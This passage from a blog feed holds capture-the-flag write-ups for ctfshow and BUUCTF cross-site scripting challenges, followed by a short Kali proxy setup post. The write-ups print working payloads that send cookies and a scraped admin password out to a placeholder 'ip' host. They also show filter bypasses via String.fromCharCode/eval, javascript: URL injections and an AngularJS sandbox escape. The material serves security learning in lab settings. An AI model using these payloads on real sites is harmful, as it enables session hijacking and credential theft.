        <content type="html"><![CDATA[<h2 id="ctfshowæ··åˆå‹XSS"><a href="#ctfshowæ··åˆå‹XSS" class="headerlink" title="ctfshowæ··åˆå‹XSS"></a>ctfshowæ··åˆå‹XSS</h2><p><img src="/../images/achieve/2025/12/image-20260104171728360.png" alt="image-20260104171728360"></p><p>æ³¨å†Œä¸ªç”¨æˆ·ï¼Œæœ‰ä¸ªç­¾åçš„åŠŸèƒ½ï¼Œç®¡ç†å‘˜ä¼šå®¡æ ¸ï¼Œæ‹¿cookie</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  fetch(&#x27;http://ip/?cookie=&#x27; + encodeURIComponent(document.cookie));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æ‹¿ä¸åˆ°ä¼°è®¡æ˜¯å¼€äº†<strong>http only</strong>ï¼Œé˜²æ­¢è¯»å–cookieï¼é¢˜ç›®æç¤ºï¼šè·å–ç®¡ç†å‘˜å¯†ç </p><p><img src="/../images/achieve/2025/12/image-20260104172448180.png" alt="image-20260104172448180"></p><p>ç™»å½•ä¹‹åè´¦å¯†å…¨åœ¨ç½‘é¡µæºç é‡Œé¢ï¼Œç›´æ¥Xå°±å®Œäº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open(&#x27;GET&#x27;, &#x27;/profile&#x27;, true);</span><br><span class="line">xhr.onload = function() &#123;</span><br><span class="line">var pass = this.responseText.match(/id=&quot;upass&quot;.*?&gt;(.*?)&lt;<span class="keyword">\/</span>div&gt;/)[1];</span><br><span class="line">fetch(&#x27;http://ip/?p=&#x27; + btoa(pass));</span><br><span class="line">&#125;;</span><br><span class="line">xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20260104173307039.png" alt="image-20260104173307039"></p><p>base64è§£ç ä¹‹åå°±æ˜¯flag</p><h2 id="ctfshowç¼–ç ç»•è¿‡XSSè¿‡æ»¤"><a href="#ctfshowç¼–ç ç»•è¿‡XSSè¿‡æ»¤" class="headerlink" title="ctfshowç¼–ç ç»•è¿‡XSSè¿‡æ»¤"></a>ctfshowç¼–ç ç»•è¿‡XSSè¿‡æ»¤</h2><p>è‡ªå·±fuzzå‡ºæ¥è¿‡æ»¤äº†scriptå’Œ&#x2F;ï¼Œé‚£ä¹ˆé¦–å…ˆæ˜¯ä¸Šä¸€ä¸ªpayloadçš„æ ‡ç­¾å°±ä¸èƒ½ç”¨æ¥ï¼ˆå¤§å°å†™æ²¡ç»•è¿‡ï¼‰ï¼Œç”¨imgæ ‡ç­¾</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=xss onerror=alert(&#x27;ljf666&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>åœ¨onerrorå†™å…¥æˆ‘ä»¬çš„jsä»£ç ï¼Œåªä¸è¿‡&#x2F;è¿™ä¸ªæ²¡äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–ç ä¸€ä¸‹ã€‚å‚è€ƒï¼š<a href="https://developer.aliyun.com/article/1575647">XSSç»•è¿‡æŠ€å·§å¤§å…¨ä»ç©ºæ ¼ç¼–ç åˆ°JSä¼ªåè®®-å¼€å‘è€…ç¤¾åŒº-é˜¿é‡Œäº‘</a></p><p>è¿™é‡Œå†™äº†ä¸ªè„šæœ¬è½¬åŒ–æˆascii</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_ascii</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="comment"># ä½¿ç”¨ ord() è·å–æ¯ä¸ªå­—ç¬¦çš„ ASCII å€¼ï¼Œå¹¶è½¬ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">    ascii_values = [<span class="built_in">str</span>(<span class="built_in">ord</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> text]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”¨é€—å·è¿æ¥</span></span><br><span class="line">    result = <span class="string">&quot;,&quot;</span>.join(ascii_values)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># äº¤äº’è¾“å…¥</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥è¦è½¬æ¢çš„ä»£ç : &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nè½¬æ¢åçš„ ASCII åºåˆ—ä¸º:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(string_to_ascii(payload))</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();xhr.open(&#x27;GET&#x27;, &#x27;/profile&#x27;, true);xhr.onload = function()&#123;var pass = this.responseText.match(/id=&quot;upass&quot;.*?&gt;(.*?)&lt;<span class="keyword">\/</span>div&gt;/)[1];fetch(&#x27;http://ip/?p=&#x27; + btoa(pass));&#125;;xhr.send();//è¿™éƒ¨åˆ†çš„asciiç å¡«å…¥payloadå°±å¥½äº†</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode())&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="BUUCTF-ç¬¬äºŒç« -webè¿›é˜¶-XSSé—¯å…³"><a href="#BUUCTF-ç¬¬äºŒç« -webè¿›é˜¶-XSSé—¯å…³" class="headerlink" title="BUUCTF[ç¬¬äºŒç«  webè¿›é˜¶]XSSé—¯å…³"></a>BUUCTF[ç¬¬äºŒç«  webè¿›é˜¶]XSSé—¯å…³</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>æœ€ç®€å•çš„alertå¼¹çª—</p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>ä¸è¡Œäº†ï¼ŒæŸ¥çœ‹æºç çœ‹jsçš„å¤„ç†é€»è¾‘</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> username = <span class="string">&#x27;xss&#x27;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª<code>escape</code>å¯¹&lt;&gt;()è¿›è¡Œäº†urlç¼–ç ç„¶åç»•è¿‡ä¸äº†ï¼Œäºæ˜¯çœ‹å®ƒä¹‹å‰çš„ä¸œè¥¿<code>var username = &#39;xss&#39;;</code>è¿™é‡Œæœ¬èº«å°±æ˜¯åœ¨scriptæ ‡ç­¾ä¹‹å†…ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é€ƒé€¸ä¸å°±å®Œäº‹äº†XDï¼</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#x27;;alert(1);&#x27;</span><br></pre></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>æˆ‘çš„æ€è·¯ï¼šè¿™ä¸ªç¬¬ä¸€ä¸ªå¼•å·è¢«è½¬ä¹‰äº†ï¼Œçœ‹jsï¼Œå‘ç°æ²¡escapeå‡½æ•°äº†ï¼Œé‚£ç›´æ¥scriptæ ‡ç­¾å»æ‰“ï¼Œä½†æ˜¯è¿™é‡Œå¹¶ä¸è¡Œã€‚</p><p>å½“ä½ ä½¿ç”¨ <code>document.getElementById(&#39;ccc&#39;).innerHTML = &quot;...&quot;</code> æ’å…¥ä»£ç æ—¶ï¼Œç°ä»£æµè§ˆå™¨ï¼ˆéµå¾ª HTML5 æ ‡å‡†ï¼‰ä¼šé‡‡å–ä»¥ä¸‹é€»è¾‘ï¼š</p><ul><li><strong>å®‰å…¨æ‹¦æˆª</strong>ï¼šæµè§ˆå™¨ä¼šè§£æå¹¶æ¸²æŸ“é‡Œé¢çš„ HTML æ ‡ç­¾ï¼Œä½†å¦‚æœå‘ç°é‡Œé¢æœ‰ <code>&lt;script&gt;</code> æ ‡ç­¾ï¼Œå®ƒä¼šå°†å…¶æ ‡è®°ä¸ºâ€œä¸å¯æ‰§è¡Œâ€ã€‚</li><li><strong>åŸå› </strong>ï¼šè¿™æ˜¯ä¸ºäº†é˜²æ­¢æœ€åŸºæœ¬çš„ XSS æ”»å‡»ã€‚å¦‚æœé€šè¿‡è„šæœ¬åŠ¨æ€æ·»åŠ çš„è„šæœ¬éƒ½èƒ½è·‘ï¼Œé‚£ç½‘é¡µå®‰å…¨æ€§å°±å¤ªè„†å¼±äº†ã€‚</li></ul><p>æ‰€ä»¥scriptæ ‡ç­¾ç”¨ä¸æ¥ï¼Œäºæ˜¯ç”¨imgå°±è¡Œ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>æ›´éªšçš„æ€è·¯ï¼šæ³¨æ„åˆ°åªè½¬ä¹‰äº†ç¬¬ä¸€ä¸ªâ€™ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”¨ç¬¬äºŒä¸ªâ€™æ¥é—­åˆä¸å°±å®Œäº‹äº†XDï¼Œå¤ªéªšäº†è¿™ä¸ªæ€è·¯ï¼Œ<strong>è¿™å‘Šè¯‰æˆ‘ä»¬äº‰å¯¹ä¸€ä¸ªç°è±¡è¦å¤šå»æƒ³æƒ³å®ƒæ„å‘³ç€ä»€ä¹ˆï¼Œæˆ‘ä»¬èƒ½åšä»€ä¹ˆã€‚</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#x27;&#x27;;alert(1);&#x27;</span><br></pre></td></tr></table></figure><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> time = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> jumpUrl;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">    jumpUrl = location.<span class="property">href</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    jumpUrl = <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">jump</span>(<span class="params">time</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(time == <span class="number">0</span>)&#123;</span><br><span class="line">    location.<span class="property">href</span> = jumpUrl;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    time = time - <span class="number">1</span> ;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">`é¡µé¢<span class="subst">$&#123;time&#125;</span>ç§’åå°†ä¼šé‡å®šå‘åˆ°<span class="subst">$&#123;<span class="built_in">escape</span>(jumpUrl)&#125;</span>`</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å…ˆåˆ†æjsï¼Œjsä¸æ˜¯å¾ˆä¼šï¼Œçœ‹äº†å¥½ä¸€ä¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">    jumpUrl = location.<span class="property">href</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    jumpUrl = <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ˜¯setä¸åŒæƒ…å†µä¸‹çš„jumpUrlçš„è¿”å›å€¼ï¼Œåé¢å°±æ˜¯ä¸¤ä¸ªå‡½æ•°ï¼Œæˆ‘ä¹Ÿéƒ½çœ‹äº†ä¸€è¾¹ï¼Œç†è®ºä¸Šä»£ç å®¡è®¡ç»å¯¹ä¸æ˜¯æˆ‘è¿™æ ·çœ‹çš„ï¼Œä¸»è¦æ˜¯è¿™é‡Œä»£ç ä¸æ˜¯ç‰¹åˆ«å¤šï¼</p><p>é¦–å…ˆå…³æ³¨document.getElementById(â€˜cccâ€™).innerHTML&#x3D; <code>é¡µé¢$&#123;time&#125;ç§’åå°†ä¼šé‡å®šå‘åˆ°$&#123;escape(jumpUrl)&#125;</code>;è¿™é‡Œtimeæ˜¾ç„¶ä¸å¯æ§ï¼Œä½†æ˜¯jumpUrlï¼Œå¦‚æœè¿›å…¥ifæ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œè¿™é‡Œæˆ‘å…¶å®å°±åœ¨æƒ³è¿™ä¸ªåœ°æ–¹å¦‚æœå¯æ§ï¼Œåº”è¯¥æ˜¯å¯ä»¥ç”¨JavaScriptä¼ªåè®®çš„ï¼Œæ‰€ä»¥è·Ÿè¿›getQueryVariable</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function getQueryVariable(variable)</span><br><span class="line">&#123;</span><br><span class="line">       var query = window.location.search.substring(1);</span><br><span class="line">       var vars = query.split(&quot;<span class="built_in">&amp;</span>&quot;);</span><br><span class="line">       for (var i=0;i&lt;vars.length;i++) &#123;</span><br><span class="line">               var pair = vars[i].split(&quot;=&quot;);</span><br><span class="line">               if(pair[0] == variable)&#123;return pair[1];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       return(false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆå°†æŸ¥è¯¢å‚æ•°æŒ‰&amp;åˆ†å‰²æˆæ•°ç»„varsï¼Œç„¶åå¯¹äºæ¯ä¸ªvarsé‡Œé¢çš„å…ƒç´ æŒ‰ç…§&#x3D;åˆ†å‰²æˆæ•°ç»„pairï¼Œæ¥ç€å¦‚æœæ»¡è¶³è¦æ±‚å°±è¿”å›æŸ¥è¯¢å‚æ•°çš„å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ff866b2d-5ccf-4a19-ab82-5a4df21498b3.node5.buuoj.cn:81/level4?jumpUrl=javascript:alert(1)</span><br></pre></td></tr></table></figure><p>è¿™é¢˜ä¸»è¦æ˜¯å®¡è®¡ä¸€ä¸‹jsï¼ŒåŠ åˆ©ç”¨JavaScriptä¼ªåè®®</p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>åˆ†æjs</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;autosubmit&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> autoForm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;autoForm&#x27;</span>);</span><br><span class="line">    autoForm.<span class="property">action</span> = (<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>) == <span class="literal">false</span>) ? location.<span class="property">href</span> : <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">    autoForm.<span class="title function_">submit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å®¹æ˜“çŸ¥é“actionçš„åœ°å€å¯ä»¥è¢«æ§åˆ¶</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://7a4463a3-73f0-44f2-80ff-346d1962e771.node5.buuoj.cn:81/level5?autosubmit=1<span class="built_in">&amp;</span>action=javascript:alert(1)</span><br></pre></td></tr></table></figure><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>AngularJSæ¡†æ¶ï¼ŒAngularJS v1.4.6çš„æ²™ç®±é€ƒé€¸</p><p>å‚è€ƒï¼š<a href="https://nosec.org/home/detail/4153.html">AngularJSå®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆXSSï¼‰|NOSECå®‰å…¨è®¯æ¯å¹³å° - ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é™¢</a></p><p><a href="https://xz.aliyun.com/news/4270">AngularJS Sandbox Bypasses-å…ˆçŸ¥ç¤¾åŒº</a></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://7a4463a3-73f0-44f2-80ff-346d1962e771.node5.buuoj.cn:81/level6?username=&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;<span class="built_in">$</span>eval(&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;);&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‰“å®Œäº†å°±æ˜¯flag</p><h2 id="buu-xss-course-1"><a href="#buu-xss-course-1" class="headerlink" title="buu xss course 1"></a>buu xss course 1</h2><p><img src="/../images/achieve/2026/1/image-20260109151915405.png" alt="image-20260109151915405"></p><p>ä¸€ä¸ªåæ§½çš„ä¸œè¥¿ï¼Œæ²¡æœ‰registeré¡µé¢ï¼Œç›´æ¥æ‰“xsså§ç”¨çš„æ˜¯imgæ ‡ç­¾ï¼Œä½†æ˜¯buué¶æœºè¿™ä¸ªä¸œè¥¿ä¸å‡ºç½‘ï¼Œæ‰€ä»¥ä½ ç”¨å…¬ç½‘IPæ˜¯ä¸è¡Œçš„ï¼Œä¸è¿‡æˆ‘å€’æ˜¯å‘ç°äº†ä¸€ä¸ªxssä¸é”™çš„å¹³å°ï¼ˆ<a href="https://xssjs.com/%EF%BC%89">https://xssjs.com/ï¼‰</a></p><p>é‚£ä¹ˆbuuäº‰å¯¹è¿™ä¸ªæ˜¯æœ‰ä¸€ä¸ªå†…ç½‘éš§é“çš„æ­å»º</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;fetch(&#x27;//ip?c=&#x27;+escape(document.cookie))&quot;&gt;</span><br></pre></td></tr></table></figure><p>æœ¬åœ°pythonèµ·ä¸ªwebæœåŠ¡</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2026/1/image-20260109152845851.png" alt="image-20260109152845851"></p><p>æ‹¿åˆ°ç®¡ç†å‘˜cookieï¼Œå»åå°åœ°å€&#x2F;backend&#x2F;admin.phpï¼Œæ›´æ”¹ä¸€ä¸‹cookieå³å¯è·å¾—flag</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xssåŠ«æŒå¯†ç  </tag>
            
            <tag> xssç¼–ç ç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kalié…ç½®ä»£ç†ä¸‹è½½GitHack</title>
      <link href="/2025/12/27/kali%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E4%B8%8B%E8%BD%BDGitHack/"/>
      <url>/2025/12/27/kali%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E4%B8%8B%E8%BD%BDGitHack/</url>
      
        <content type="html"><![CDATA[<p>GitHackå·¥å…·è½åäº†ï¼Œæ‰€ä»¥é‡æ–°ä¸‹è½½ä¸€ä¸ªï¼Œé…ç½®ä¸€ä¸‹ä»£ç†</p><h2 id="æœ€ç®€å•çš„åŠæ³•"><a href="#æœ€ç®€å•çš„åŠæ³•" class="headerlink" title="æœ€ç®€å•çš„åŠæ³•"></a>æœ€ç®€å•çš„åŠæ³•</h2><p>ç›´æ¥å¼€å¯TUNæ¨¡å¼ï¼Œä»€ä¹ˆéƒ½ä¸ç”¨é…</p><p><img src="/../images/achieve/2026/1/image-20260219230923357.png" alt="image-20260219230923357"></p><h2 id="ç½‘ä¸Šçœ‹çš„æ•™ç¨‹"><a href="#ç½‘ä¸Šçœ‹çš„æ•™ç¨‹" class="headerlink" title="ç½‘ä¸Šçœ‹çš„æ•™ç¨‹"></a>ç½‘ä¸Šçœ‹çš„æ•™ç¨‹</h2><p>å½“æ—¶ç½‘ä¸Šæœçš„æ•™ç¨‹å°±æ˜¯è¿™æ ·æå¾—ï¼Œåé¢å¸ˆå‚…å’Œæˆ‘è¯´ç›´æ¥å¼€tunæ¨¡å¼å°±okäº†</p><h3 id="é…ç½®ä»£ç†"><a href="#é…ç½®ä»£ç†" class="headerlink" title="é…ç½®ä»£ç†"></a>é…ç½®ä»£ç†</h3><p>åœ¨clashé‡Œé¢æŠŠå±€åŸŸç½‘è¿æ¥æ‰“å¼€ï¼Œåªè¦æ˜¯æˆ‘è¿™å°ç”µè„‘çš„ç½‘å¡è¿›æ¥éƒ½èµ°è¿™ä¸ª</p><p><img src="/../images/achieve/2025/12/image-20251227211234755.png" alt="image-20251227211234755"></p><p>å°±æ˜¯clashè¦å¼€å¯å±€åŸŸç½‘æ¨¡å¼ï¼Œå°±æ˜¯è¯´åŒä¸€å±€åŸŸç½‘éƒ½å¯ä»¥èµ°è¿™ä¸ªä»£ç†ï¼Œç„¶åkaliå’Œç‰©ç†æœºå°±æ˜¯åœ¨åŒä¸€å±€åŸŸç½‘ï¼Œæ‰€ä»¥åªéœ€è¦ç»™kalié…ç½®ä¸´æ—¶ä»£ç†å³å¯</p><p>è™šæ‹Ÿæœºè®¾ç½®é‡Œé¢ï¼Œç„¶åkalié…ç½®ä¸´æ—¶ä»£ç†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http<span class="built_in">_</span>proxy=&quot;http://192.168.1.11:7897&quot;                                       </span><br><span class="line">export https<span class="built_in">_</span>proxy=&quot;http://192.168.1.11:7897&quot;</span><br></pre></td></tr></table></figure><p>IPä¸ºæ— çº¿å±€åŸŸç½‘é€‚é…å™¨ WLANä¸‹çš„ipv4</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -I https://google.com   </span><br><span class="line">ç”¨è¿™ä¸ªæ¥æ£€éªŒä¸€ä¸‹</span><br></pre></td></tr></table></figure><h2 id="ä¸‹è½½å·¥å…·"><a href="#ä¸‹è½½å·¥å…·" class="headerlink" title="ä¸‹è½½å·¥å…·"></a>ä¸‹è½½å·¥å…·</h2><p>ç›´æ¥</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lijiejie/GitHack.git</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>ç›´æ¥çœ‹æˆ‘ä¹‹å‰çš„æ–‡ç« </p><p><a href="https://blog.csdn.net/2403_88003384/article/details/148908011?ops_request_misc=%7B%22request_id%22:%227a7a133f531abfa6c67ffbe60fe89786%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=7a7a133f531abfa6c67ffbe60fe89786&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-148908011-null-null.nonecase&utm_term=git&spm=1018.2226.3001.4450">CTFHub Web ä¿¡æ¯æ³„éœ² 